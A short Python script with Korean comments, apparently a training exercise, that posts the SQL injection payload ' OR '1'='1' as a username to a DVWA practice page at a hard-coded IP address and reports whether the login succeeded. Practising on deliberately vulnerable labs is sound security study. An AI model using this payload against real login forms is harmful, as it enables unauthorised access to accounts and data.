import requests

url = "http://210.110.39.89/DVWA/vulnerabilities/sqli/"  # 로그인 페이지 URL
payload = "' OR '1'='1'"  # SQL Injection 공격에 사용될 취약한 입력

# 웹 애플리케이션에 POST 요청 보내기
data = {"username": payload, "password": "password123"}
response = requests.post(url, data=data)

# 응답 분석하여 SQL Injection 공격의 성공 여부 확인
if "로그인 성공" in response.text:
    print("SQL Injection 공격이 성공했습니다.")
else:
    print("SQL Injection 공격이 실패했습니다.")
